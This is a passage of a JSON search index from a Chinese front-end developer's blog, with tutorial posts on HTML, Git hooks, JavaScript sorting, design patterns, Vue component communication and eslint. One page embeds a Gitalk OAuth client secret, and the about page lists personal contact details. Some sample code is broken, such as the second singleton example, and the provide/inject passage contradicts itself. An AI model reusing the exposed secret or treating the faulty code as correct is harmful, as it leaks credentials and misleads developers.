{"pages":[{"title":"","text":"site-verification: dd72084801cc52aac876bc9d7adb7c9c","link":"/dd72084801cc52aac876bc9d7adb7c9c.html"},{"title":"","text":"个人简介联系方式手机号: 171-**-2662Email: 437044048@qq.comWeChat: hjb94110QQ交流群：749076211 个人信息胡金斌/男/1994职位: 前端开发工程师地点: 杭州2015年6月份开始从事前端工作。 前端爱好者 博客信息 网站采用的Icarus主题 追求尽可能的简洁，清晰，易用。 在Icarus主题之上进行了部分修改。 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page网站cdn优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中gitalk最新评论的获取 博客图片上传picgo工具github图传使用 安装、部分配置icarus主题中文版","link":"/about/index.html"},{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：http://cdn.leheavengame.com/jue/images/89090210-71cf-11eb-98c3-375c38d4a5d6.jpeg 网站名称：胡金斌的个人网站 网站地址：https://hjb.leheavengame.com/ 网站简介：前端开发，技术交流 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '80d9615d7f9ac170422a', clientSecret: '96a3ef8319106445349a5c16e716dcf5caa0e887', id: '666666', repo: 'myBlog', owner: 'hujinbin', admin: \"hujinbin\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"HTML的两类标签：行标签和块标签","text":"行标签：包含a、span、em、strong、img、var；a 标签：主要用来链接一个其他的网页； span 标签：主要用来对行内的文字进行一些样式以及其他的操作； em 标签：一般用来对文字进行强调，使用斜体体现出来； strong 标签：一般用来对文字进行强调，使用加粗字体体现出来； img 标签：图片引用标签，其中 src属性中写入图片的地址； var 标签：JavaScript中命名变量的标签。 块标签：包含p、div、ul、ol、li、dl、dt、dd、h1~h6；p 标签：段落标签，段落文字使用，默认格式：段尾进行换行； div 标签：划分块的主要使用标签； ul 标签：无序列表的主标签，后面的标号为圆点（黑色）； ol 标签：有序列表的主标签，后面一般跟有序的1,2,3,4,5…； li 标签：列表中的主体使用标签 dl 标签：自定义标签的主标签； dt 标签：自定义标签的表头； dd 标签：自定义标签的表头的解释（描述）信息； h1~h6：6级标题标签、字体的大小依次变小。 块标签和行标签的区别：◆ 块标签：独自占领一行、可以进行宽高的数值的设定； ◆ 行标签：在一行内显示、不可以进行宽高的数值设定，设置了标签的行高（line-height）可以改变标签的高度； 嵌套规则◆ 块标签可以套行标签，行标签不可以套块标签。 ◆ p标签不要套块属性标签，可以套a，span，文本。 ◆ 嵌套的时候注意代码的缩进。 注：必要的时候 行内标签和块标签是可以相互转换的（通过display属性）。","link":"/2018/05/03/HTML%E7%9A%84%E4%B8%A4%E7%B1%BB%E6%A0%87%E7%AD%BE%EF%BC%9A%E8%A1%8C%E6%A0%87%E7%AD%BE%E5%92%8C%E5%9D%97%E6%A0%87%E7%AD%BE/"},{"title":"Git提交规范保护","text":"Git 规范Git 作为现在最流行的分布式管理工具，基本上是每个团队的必备。 Git Commit格式校验 准备commitlint/cli用于格式校验 准备husky用于git提交代码时触发校验 huskyhusky 是创建 git 客户端 hooks 的神器。 目前最新版本是 7.*，文档在这里(opens new window) 初始化 husky 只需要三步。首先要安装： 1$ npm i husky --save-dev 执行下面的脚本，会初始化一个 .husky 目录： 1$ npx husky install 初始化后，就可以添加 hook 了。 添加一个 commit-msg 钩子，并指定一个默认 shell： 1$ npx husky add .husky/commit-msg 'npx --no-install commitlint --edit &quot;$1&quot;' 现在在执行 git commit 之前，就会执行上面指定的 shell。 commitlint上面的 shell 里有一个 commitlint 命令，其实它是另一个工具，用来校验 commit 提交信息，这是 husky + commitlint 这对黄金搭档的主要功能。 commitlint 的文档在这里(opens new window) 为了直观的看出 commit 的更新内容，开发者社区诞生了一种规范，将 commit 按照功能划分，加一些固定前缀，比如 fix:，feat:，用来标记这个 commit 主要做了什么事情。 commitlint 命令就是校验 commit 信息是否符合上述规范，不符合，则会配合 husky 阻止提交。 首先安装 commitlint： 1$ npm i @commitlint/{config-conventional,cli} --save-dev 然后创建配置文件： 1echo &quot;module.exports = {extends: ['@commitlint/config-conventional']}&quot; &gt; commitlint.config.js 这样就好了，然后我们随便改一处代码，试试效果： 12$ git add .$ git commit -m 'test' 因为 “test” 不符合 commit 规范，所以被阻止了，执行结果如下： 我们再试一下符合规范的提交格式： 1$ git commit -m 'fix: 修复**功能' 这样就可以通过了！ commit前缀目前主流的前缀包括以下部分： build：表示构建，发布版本可用这个 ci：更新 CI/CD 等自动化配置 chore：杂项，其他更改 docs：更新文档 feat：常用，表示新增功能 fix：常用：表示修复 bug perf：性能优化 refactor：重构 revert：代码回滚 style：样式更改 test：单元测试更改","link":"/2021/11/24/Git%E6%8F%90%E4%BA%A4%E8%A7%84%E8%8C%83%E4%BF%9D%E6%8A%A4/"},{"title":"JavaScript的数组排序","text":"1. JavaScript的sort()方法123456var array = [1,4,-8,-3,6,12,9,8];function compare(val1,val2){ return val1-val2;};array.sort(compare);document.write(array); sort()方法按照升序排列数组项，会调用每个数组项的toString()转型方法，然后比较得到的字符串。 toString()方法是把布尔值（Boolean）或对象(Object)转换为字符串，并返回结果。 compare()函数方法是一个比较函数，作为sort()方法的参数。 2. 冒泡排序（从后向前）123456789101112131415var array = [1,4,-8,-3,6,12,9,8];function sort(arr){ for(var j=0;j&lt;arr.length-1;j++){ //两两比较，如果前一个比后一个大，则交换位置。 for(var i=0;i&lt;arr.length-1-j;i++){ if(arr[i]&gt;arr[i+1]){ var temp = arr[i]; arr[i] = arr[i+1]; arr[i+1] = temp; } } }}sort(array);document.write(array); （1）比较相邻的元素。如果第一个比第二个大，就交换他们两个位置。（2）对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。（3）针对所有的元素重复以上的步骤，除了最后一个。（4）持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 3. 快速排序：递归思想，两边快速的排序，冒泡排序的改进123456789101112131415161718192021222324var array = [1,4,-8,-3,6,12,9,8];function quickSort(arr){//如果数组长度小于等于1，则返回数组本身 if(arr.length&lt;=1){ return arr; } //定义中间值的索引 var index = Math.floor(arr.length/2); //取到中间值 var temp = arr.splice(index,1); //定义左右部分数组 var left = []; var right = []; for(var i=0;i&lt;arr.length;i++){ //如果元素比中间值小，那么放在左边，否则放右边 if(arr[i]&lt;temp){ left.push(arr[i]); }else{ right.push(arr[i]); } } return quickSort(left).concat(temp,quickSort(right));}document.write(quickSort(array)); Math.floor(x)方法是向下取整，返回小于或等于x的最接近的整数。 splice(index,num,item)方法是向数组中添加项目，或是从数组中删除项目，并返回被删除的项目。 index是整数，被操作项目所在的位置（必须）num是整数，要删除的项目的数量，如果为0，表示不删除（必须）item是向数组中添加的新项目，可以是多个（可选）push()方法是向数组末尾添加一个或多个新项目并返回新数组的长度 concat()方法连接两个或多个数组，不会改变原有数组，返回一个新数组 4. 插入排序12345678910111213141516171819202122var array = [1,4,-8,-3,6,12,9,8];function insertSort(arr){//假设第0元素是有序序列，第1元素之后是无序的序列。从第1元素开始依次将无序序列的元素插入到有序序列中 for(var i=1; i&lt;arr.length;i++){ if(arr[i]&lt;arr[i-1]){ //取出无序序列中需要插入的第i个元素 var temp = arr[i]; //定义有序中的最后一个位置 var j = i-1; arr[i] = arr[j]; //比较大小，找到插入的位置 while(j&gt;=0&amp;&amp;temp&lt;arr[j]){ arr[j+1] = arr[j]; j--; }; //插入 arr[j+1] = temp; } } }insertSort(array)document.write(array); （1）从第一个元素开始，该元素可以认为已经被排序（2）取出下一个元素，在已经排序的元素序列中扫描（3）如果该元素（已排序）大于新元素，将该元素移到下一位置（4）重复步骤3，直到找到已排序的元素小于或者等于新元素的位置（5）将新元素插入到下一位置中（6）重复步骤2 5. 选择排序1234567891011121314151617181920var array = [1,4,-8,-3,6,12,9,8];function selectSort(arr){ for(var i=0;i&lt;arr.length;i++){ //设置当前范围最小值和索引 var min = arr[i]; var minIndex = i; //在该范围选出最小值 for(var j=i+1;j&lt;arr.length;j++){ if(min&gt;arr[j]){ min = arr[j]; minIndex = j; } } //将最小值插入,并将原来位置的最小值删除 arr.splice(i,0,min); arr.splice(minIndex+1,1); }}selectSort(array);document.write(array); （1）在未排序序列中找到最小（大）元素（2）并存放到排序序列的起始位置（3）然后，再从剩余未排序元素中继续寻找最小（大）元素（4）然后放到已排序序列的末尾。（5）以此类推","link":"/2018/07/21/JavaScript%E7%9A%84%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F/"},{"title":"JavaScript设计模式之策略模式","text":"策略模式：定义了一系列家族算法，并对每一种算法单独封装起来，让算法之间可以相互替换，独立于使用算法的客户。通俗的讲就是根据不同的参数可以定义不同的策略。策略模式是JavaScript中比较经典的模式之一, 可以减少大量的if语句,可复用程度高 如下面的例子: 123456789101112131415//清除字符空格const trim = { 'A': function (str, type) { return str.replace(/\\s+/g, &quot;&quot;); }, 'B': function (str, type) { return str.replace(/(^\\s*)|(\\s*$)/g, &quot;&quot;); }, 'C': function (str, type) { return str.replace(/(^\\s*)/g, &quot;&quot;); }, 'D': function (str, type) { return str.replace(/(\\s*$)/g, &quot;&quot;); }}","link":"/2018/05/22/JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/"},{"title":"JavaScript设计模式之单例模式","text":"单例模式概念：保证一个类只有一个实例。概念：单例就是保证一个类只有一个实例，实现方法一般是先判断实例存在与否，如果存在直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。在JavaScript里，单例作为一个命名空间提供者，从全局命名空间里提供一个唯一的访问点来访问该对象。 单例模式的作用和注意事项模式作用： 1、模块间通信 2、系统中某个类的对象只能存在一个 3、保护自己的属性和方法 注意事项： 1、注意this的使用 2、闭包容易造成内存泄露，不需要的要赶快干掉 3、注意new的成本。（继承） 单例模式代码例子最简单的实现方式，就是使用对象字面量的方法 1234567let testSingleton_1 = { pt_1: 'test1', pt_2: 'test2', testFunc: function() { console.log('最简单的单例模式'); }} 如果要使用自己的私有变量和方法，可以使用闭包来封装这些属性和函数，只暴露出公有变量和方法即可 12345678910111213141516let testSingleton_2 = { let p_1 = '私有变量'; function testFunc() { console.log('我是私有方法', p_1); } //暴露出的对象，你在里面可以定义你的想要给别人看到的东西 return { p_2: '公有变量', testFunc_2: function() { console.log('公有方法'); testFunc(); } }} 在使用的时候初始化可以提高效率 123456789101112131415161718192021222324252627282930let testSingleton_3 = (function() { let instance; let p_1 = '私有变量'; function testFunc() { console.log('我是私有方法', p_1); } function init() { //操作你的需求逻辑 return { p_2: '公有变量', testFunc_2: function() { console.log('公有方法'); testFunc(); } } } return { getInstance: function() { if(!instance) { instance = init(); } return instance; } }})(); 单例模式的宗旨就是保持一个类只有一个实例","link":"/2018/05/28/JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"title":"Vue组件间的通信方式","text":"方法一、props/$emit父组件 A 通过 props 的方式向子组件 B 传递，B to A 通过在 B 组件中 $emit, A 组件中 v-on 的方式实现。 父组件向子组件传值接下来我们通过一个例子，说明父组件如何向子组件传递值：在子组件 Users.vue 中如何获取父组件 App.vue 中的数据 users:[“王小虎”,”张三”,”李四”] 123456789101112131415161718192021//App.vue父组件&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;users v-bind:users=&quot;users&quot;&gt;&lt;/users&gt;//前者自定义名称便于子组件调用，后者要传递数据名 &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Users from &quot;./components/Users&quot;export default { name: 'App', data(){ return{ users:[&quot;王小虎&quot;,&quot;张三&quot;,&quot;李四&quot;] } }, components:{ &quot;users&quot;:Users }} 12345678910111213141516171819//users子组件&lt;template&gt; &lt;div class=&quot;hello&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;user in users&quot;&gt;{{user}}&lt;/li&gt;//遍历传递过来的值，然后呈现到页面 &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { name: 'HelloWorld', props:{ users:{ //这个就是父组件中子标签自定义名字 type:Array, required:true } }}&lt;/script&gt; 父组件通过 props 向下传递数据给子组件。注：组件中的数据共有三种形式：data、props、computed 子组件向父组件传值（通过事件形式）接下来我们通过一个例子，说明子组件如何向父组件传递值：当我们点击“Vue.js Demo”后，子组件向父组件传递值，文字由原来的“传递的是一个值”变成“子向父组件传值”，实现子组件向父组件值的传递。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 子组件&lt;template&gt; &lt;header&gt; &lt;h1 @click=&quot;changeTitle&quot;&gt;{{title}}&lt;/h1&gt;//绑定一个点击事件 &lt;/header&gt;&lt;/template&gt;&lt;script&gt;export default { name: 'app-header', data() { return { title:&quot;Vue.js Demo&quot; } }, methods:{ changeTitle() { this.$emit(&quot;titleChanged&quot;,&quot;子向父组件传值&quot;);//自定义事件 传递值“子向父组件传值” } }}&lt;/script&gt;// 父组件&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;app-header v-on:titleChanged=&quot;updateTitle&quot; &gt;&lt;/app-header&gt;//与子组件titleChanged自定义事件保持一致 // updateTitle($event)接受传递过来的文字 &lt;h2&gt;{{title}}&lt;/h2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Header from &quot;./components/Header&quot;export default { name: 'App', data(){ return{ title:&quot;传递的是一个值&quot; } }, methods:{ updateTitle(e){ //声明这个函数 this.title = e; } }, components:{ &quot;app-header&quot;:Header, }}&lt;/script&gt; 子组件通过 events 给父组件发送消息，实际上就是子组件把自己的数据发送到父组件。 方法二、$emit/$on这种方法通过一个空的 Vue 实例作为中央事件总线（事件中心），用它来触发事件和监听事件,巧妙而轻量地实现了任何组件间的通信，包括父子、兄弟、跨级。当我们的项目比较大时，可以选择更好的状态管理解决方案 vuex。 1.具体实现方式： 123var Event=new Vue();Event.$emit(事件名,数据);Event.$on(事件名,data =&gt; {}); 2.举个例子假设兄弟组件有三个，分别是 A、B、C 组件，C 组件如何获取 A 或者 B 组件的数据 12345678910111213141516171819202122232425262728293031&lt;div id=&quot;itany&quot;&gt; &lt;my-a&gt;&lt;/my-a&gt; &lt;my-b&gt;&lt;/my-b&gt; &lt;my-c&gt;&lt;/my-c&gt;&lt;/div&gt;&lt;template id=&quot;a&quot;&gt; &lt;div&gt; &lt;h3&gt;A组件：{{name}}&lt;/h3&gt; &lt;button @click=&quot;send&quot;&gt;将数据发送给C组件&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;template id=&quot;b&quot;&gt; &lt;div&gt; &lt;h3&gt;B组件：{{age}}&lt;/h3&gt; &lt;button @click=&quot;send&quot;&gt;将数组发送给C组件&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;template id=&quot;c&quot;&gt; &lt;div&gt; &lt;h3&gt;C组件：{{name}}，{{age}}&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;var Event = new Vue();//定义一个空的Vue实例var A = { template: '#a', data() { return { name: 'tom' } }, $on 监听了自定义事件 data-a 和 data-b，因为有时不确定何时会触发事件，一般会在 mounted 或 created 钩子中来监听。 方法三、vuex 简要介绍 Vuex 原理Vuex 实现了一个单向数据流，在全局拥有一个 State 存放数据，当组件要更改 State 中的数据时，必须通过 Mutation 进行，Mutation 同时提供了订阅者模式供外部插件调用获取 State 数据的更新。而当所有异步操作(常见于调用后端接口异步获取更新数据)或批量的同步操作需要走 Action，但 Action 也是无法直接修改 State 的，还是需要通过 Mutation 来修改 State 的数据。最后，根据 State 的变化，渲染到视图上。 简要介绍各模块在流程中的功能：Vue Components：Vue 组件。HTML 页面上，负责接收用户操作等交互行为，执行 dispatch 方法触发对应 action 进行回应。dispatch：操作行为触发方法，是唯一能执行 action 的方法。actions：操作行为处理模块,由组件中的$store.dispatch(‘action 名称’, data1)来触发。然后由 commit()来触发 mutation 的调用 , 间接更新 state。负责处理 Vue Components 接收到的所有交互行为。包含同步/异步操作，支持多个同名方法，按照注册的顺序依次触发。向后台 API 请求的操作就在这个模块中进行，包括触发其他 action 以及提交 mutation 的操作。该模块提供了 Promise 的封装，以支持 action 的链式触发。commit：状态改变提交操作方法。对 mutation 进行提交，是唯一能执行 mutation 的方法。mutations：状态改变操作方法，由 actions 中的commit(‘mutation 名称’)来触发。是 Vuex 修改 state 的唯一推荐方法。该方法只能进行同步操作，且方法名只能全局唯一。操作之中会有一些 hook 暴露出来，以进行 state 的监控等。state：页面状态管理容器对象。集中存储 Vue components 中 data 对象的零散数据，全局唯一，以进行统一的状态管理。页面显示所需的数据从该对象中进行读取，利用 Vue 的细粒度数据响应机制来进行高效的状态更新。getters：state 对象读取方法。图中没有单独列出该模块，应该被包含在了 render 中，Vue Components 通过该方法读取全局 state 对象。 Vuex 与 localStoragevuex 是 vue 的状态管理器，存储的数据是响应式的。但是并不会保存起来，刷新之后就回到了初始状态，具体做法应该在 vuex 里数据改变的时候把数据拷贝一份保存到 localStorage 里面，刷新之后，如果 localStorage 里有保存的数据，取出来再替换 store 里的 state。 1234567891011121314151617181920let defaultCity = &quot;上海&quot;try { // 用户关闭了本地存储功能，此时在外层加个try...catch if (!defaultCity){ defaultCity = JSON.parse(window.localStorage.getItem('defaultCity')) }}catch(e){}export default new Vuex.Store({ state: { city: defaultCity }, mutations: { changeCity(state, city) { state.city = city try { window.localStorage.setItem('defaultCity', JSON.stringify(state.city)); // 数据改变的时候把数据拷贝一份保存到localStorage里面 } catch (e) {} } }}) 这里需要注意的是：由于 vuex 里，我们保存的状态，都是数组，而 localStorage 只支持字符串，所以需要用 JSON 转换： 12JSON.stringify(state.subscribeList); // array -&gt; stringJSON.parse(window.localStorage.getItem(&quot;subscribeList&quot;)); // string -&gt; array 方法四、$attrs/$listeners 简介多级组件嵌套需要传递数据时，通常使用的方法是通过 vuex。但如果仅仅是传递数据，而不做中间处理，使用 vuex 处理，未免有点大材小用。为此 Vue2.4 版本提供了另一种方法—-$attrs/$listeners $attrs：包含了父作用域中不被 prop 所识别 (且获取) 的特性绑定 (class 和 style 除外)。当一个组件没有声明任何 prop 时，这里会包含所有父作用域的绑定 (class 和 style 除外)，并且可以通过 v-bind=”$attrs” 传入内部组件。通常配合 interitAttrs 选项一起使用。$listeners：包含了父作用域中的 (不含 .native 修饰器的) v-on 事件监听器。它可以通过 v-on=”$listeners” 传入内部组件接下来我们看个跨级通信的例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// index.vue&lt;template&gt; &lt;div&gt; &lt;h2&gt;简洁至上&lt;/h2&gt; &lt;child-com1 :foo=&quot;foo&quot; :boo=&quot;boo&quot; :coo=&quot;coo&quot; :doo=&quot;doo&quot; title=&quot;高性能&quot; &gt;&lt;/child-com1&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;const childCom1 = () =&gt; import(&quot;./childCom1.vue&quot;);export default { components: { childCom1 }, data() { return { foo: &quot;Javascript&quot;, boo: &quot;Html&quot;, coo: &quot;CSS&quot;, doo: &quot;Vue&quot; }; }};&lt;/script&gt;// childCom1.vue&lt;template class=&quot;border&quot;&gt; &lt;div&gt; &lt;p&gt;foo: {{ foo }}&lt;/p&gt; &lt;p&gt;childCom1的$attrs: {{ $attrs }}&lt;/p&gt; &lt;child-com2 v-bind=&quot;$attrs&quot;&gt;&lt;/child-com2&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;const childCom2 = () =&gt; import(&quot;./childCom2.vue&quot;);export default { components: { childCom2 }, inheritAttrs: false, // 可以关闭自动挂载到组件根元素上的没有在props声明的属性 props: { foo: String // foo作为props属性绑定 }, created() { console.log(this.$attrs); // { &quot;boo&quot;: &quot;Html&quot;, &quot;coo&quot;: &quot;CSS&quot;, &quot;doo&quot;: &quot;Vue&quot;, &quot;title&quot;: &quot;高性能&quot; } }};&lt;/script&gt;// childCom2.vue&lt;template&gt; &lt;div class=&quot;border&quot;&gt; &lt;p&gt;boo: {{ boo }}&lt;/p&gt; &lt;p&gt;childCom2: {{ $attrs }}&lt;/p&gt; &lt;child-com3 v-bind=&quot;$attrs&quot;&gt;&lt;/child-com3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;const childCom3 = () =&gt; import(&quot;./childCom3.vue&quot;);export default { components: { childCom3 }, inheritAttrs: false, props: { boo: String }, created() { console.log(this.$attrs); // { &quot;boo&quot;: &quot;Html&quot;, &quot;coo&quot;: &quot;CSS&quot;, &quot;doo&quot;: &quot;Vue&quot;, &quot;title&quot;: &quot;高性能&quot; } }};&lt;/script&gt;// childCom3.vue&lt;template&gt; &lt;div class=&quot;border&quot;&gt; &lt;p&gt;childCom3: {{ $attrs }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { props: { coo: String, title: String }};&lt;/script&gt; 如上图所示$attrs表示没有继承数据的对象，格式为{属性名：属性值}。Vue2.4 提供了$attrs , $listeners 来传递数据与事件，跨级组件之间的通讯变得更简单。 简单来说：$attrs与$listeners 是两个对象，$attrs 里存放的是父组件中绑定的非 Props 属性，$listeners里存放的是父组件中绑定的非原生事件。 方法五、provide/inject 简介Vue2.2.0 新增 API,这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在起上下游关系成立的时间里始终生效。一言而蔽之：祖先组件中通过 provider 来提供变量，然后在子孙组件中通过 inject 来注入变量。provide / inject API 主要解决了跨级组件间的通信问题，不过它的使用场景，主要是子组件获取上级组件的状态，跨级组件间建立了一种主动提供与依赖注入的关系。 举个例子假设有两个组件： A.vue 和 B.vue，B 是 A 的子组件 12345678910111213// A.vueexport default { provide: { name: '简洁至上' }}// B.vueexport default { inject: ['name'], mounted () { console.log(this.name); // 简洁至上 }} 可以看到，在 A.vue 里，我们设置了一个 provide: name，值为 简洁至上，它的作用就是将 name 这个变量提供给它的所有子组件。而在 B.vue 中，通过 inject 注入了从 A 组件中提供的 name 变量，那么在组件 B 中，就可以直接通过 this.name 访问这个变量了，它的值也是 浪里行舟。这就是 provide / inject API 最核心的用法。 需要注意的是：provide 和 inject 绑定并不是可响应的。这是刻意为之的。然而，如果你传入了一个可监听的对象，那么其对象的属性还是可响应的—-vue 官方文档所以，上面 A.vue 的 name 如果改变了，B.vue 的 this.name 是不会改变的，仍然是 简洁至上。 provide 与 inject 怎么实现数据响应式一般来说，有两种办法： provide 祖先组件的实例，然后在子孙组件中注入依赖，这样就可以在子孙组件中直接修改祖先组件的实例的属性，不过这种方法有个缺点就是这个实例上挂载很多没有必要的东西比如 props，methods使用 2.6 最新 API Vue.observable 优化响应式 provide(推荐)我们来看个例子：孙组件 D、E 和 F 获取 A 组件传递过来的 color 值，并能实现数据响应式变化，即 A 组件的 color 变化后，组件 D、E、F 不会跟着变（核心代码如下：） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// A 组件&lt;div&gt; &lt;h1&gt;A 组件&lt;/h1&gt; &lt;button @click=&quot;() =&gt; changeColor()&quot;&gt;改变color&lt;/button&gt; &lt;ChildrenB /&gt; &lt;ChildrenC /&gt;&lt;/div&gt;...... data() { return { color: &quot;blue&quot; }; }, // provide() { // return { // theme: { // color: this.color //这种方式绑定的数据并不是可响应的 // } // 即A组件的color变化后，组件D、E、F不会跟着变 // }; // }, provide() { return { theme: this//方法一：提供祖先组件的实例 }; }, methods: { changeColor(color) { if (color) { this.color = color; } else { this.color = this.color === &quot;blue&quot; ? &quot;red&quot; : &quot;blue&quot;; } } }// F 组件&lt;template functional&gt; &lt;div class=&quot;border2&quot;&gt; &lt;h3 :style=&quot;{ color: injections.theme.color }&quot;&gt;F 组件&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { inject: { theme: { //函数式组件取值不一样 default: () =&gt; ({}) } }};&lt;/script&gt; 虽说 provide 和 inject 主要为高阶插件/组件库提供用例，但如果你能在业务中熟练运用，可以达到事半功倍的效果！ 方法六、$parent / $children与 refref：如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素；如果用在子组件上，引用就指向组件实例$parent / $children：访问父 / 子实例需要注意的是：这两种都是直接得到组件实例，使用后可以直接调用组件的方法或访问数据。我们先来看个用 ref来访问组件的例子： 1234567891011121314151617181920212223242526// component-a 子组件export default { data () { return { title: 'Vue.js' } }, methods: { sayHello () { window.alert('Hello'); } }}// 父组件&lt;template&gt; &lt;component-a ref=&quot;comA&quot;&gt;&lt;/component-a&gt;&lt;/template&gt;&lt;script&gt; export default { mounted () { const comA = this.$refs.comA; console.log(comA.title); // Vue.js comA.sayHello(); // 弹窗 } }&lt;/script&gt; 不过，这两种方法的弊端是，无法在跨级或兄弟间通信。 1234// parent.vue&lt;component-a&gt;&lt;/component-a&gt;&lt;component-b&gt;&lt;/component-b&gt;&lt;component-b&gt;&lt;/component-b&gt; 我们想在 component-a 中，访问到引用它的页面中（这里就是 parent.vue）的两个 component-b 组件，那这种情况下，就得配置额外的插件或工具了，比如 Vuex 和 Bus 的解决方案。","link":"/2019/08/04/Vue%E7%BB%84%E4%BB%B6%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"},{"title":"Javascript toString()、toLocaleString()、valueOf()三个方法的区别","text":"Array、Boolean、Date、Number等对象都具有toString()、toLocaleString()、valueOf()三个方法，那这三个方法有什么区别？？？ 一、JS Array123456789//例子：var array = new Array(&quot;ni&quot;,&quot;li&quot;,&quot;mi&quot;);console.log(array.valueOf());console.log(array.toString());console.log(array.toLocaleString());//结果：Array[3]ni,li,mini,li,mi valueOf：返回数组本身toString()：把数组转换为字符串，并返回结果，每一项以逗号分割。toLocalString()：把数组转换为本地数组，并返回结果。 二、JS Boolean12345678//例子：var boolean = new Boolean();console.log(boolean.valueOf());console.log(boolean.toString());//结果：falsefalsefalse//谷歌浏览器下面是false valueOf：返回 Boolean 对象的原始值。toString()：根据原始布尔值或者 booleanObject 对象的值返回字符串 “true” 或 “false”。默认为”false”。toLocalString()：Boolean对象没有toLocalString()方法。但是在Boolean对象上使用这个方法也不会报错。 三、JS Date123456789//例子：var date = new Date();console.log(date.valueOf());console.log(date.toString());console.log(date.toLocaleString());//结果：1528799692512Tue Jun 12 2018 18:34:52 GMT+0800 (中国标准时间)2018/6/12 下午6:34:52 valueOf：返回 Date 对象的原始值，以毫秒表示。toString()：把 Date 对象转换为字符串，并返回结果。使用本地时间表示。toLocalString()：可根据本地时间把 Date 对象转换为字符串，并返回结果，返回的字符串根据本地规则格式化。 四、JS Math1234//例子：console.log(Math.PI.valueOf());//结果：3.141592653589793 valueOf：返回 Math 对象的原始值。 五、JS Number123456789//例子：var num = new Number(1337);console.log(num.valueOf());console.log(num.toString());console.log(num.toLocaleString());//结果：133713371,337 valueOf：返回一个 Number 对象的基本数字值。toString()：把数字转换为字符串，使用指定的基数。toLocalString()：把数字转换为字符串，使用本地数字格式顺序。 六、JS String1234567//例子： var string = new String(&quot;abc&quot;);console.log(string.valueOf());console.log(string.toString());//结果：abcabc valueOf：返回某个字符串对象的原始值。toString()：返回字符串。 七、toString()方法与toLocalString()方法区别：toLocalString()是调用每个数组元素的 toLocaleString() 方法，然后使用地区特定的分隔符把生成的字符串连接起来，形成一个字符串。 toString()方法获取的是String(传统字符串),而toLocaleString()方法获取的是LocaleString(本地环境字符串)。 LocaleString()会根据你机器的本地环境来返回字符串，它和toString()返回的值在不同的本地环境下使用的符号会有微妙的变化。 所以使用toString()是保险的，返回唯一值的方法,它不会因为本地环境的改变而发生变化。如果是为了返回时间类型的数据，推荐使用LocaleString()。","link":"/2018/06/17/Javascript-toString-%E3%80%81toLocaleString-%E3%80%81valueOf-%E4%B8%89%E4%B8%AA%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"TypeError: token.type.endsWith is not a function vue eslint 报错问题修复","text":"问题现象维护了很久的vue项目，发现 eslint 会报错 token.type.endsWith is not a function 问题原因babel-eslint npm包已被弃用，我们无法在下载到这个包，导致项目缺少依赖报错 问题解决将弃用的babel-eslint 换成@babel/eslint-parser即可 移除 babel-eslint 添加： 123&quot;eslint&quot;: &quot;7.30.0&quot;,&quot;eslint-plugin-vue&quot;: 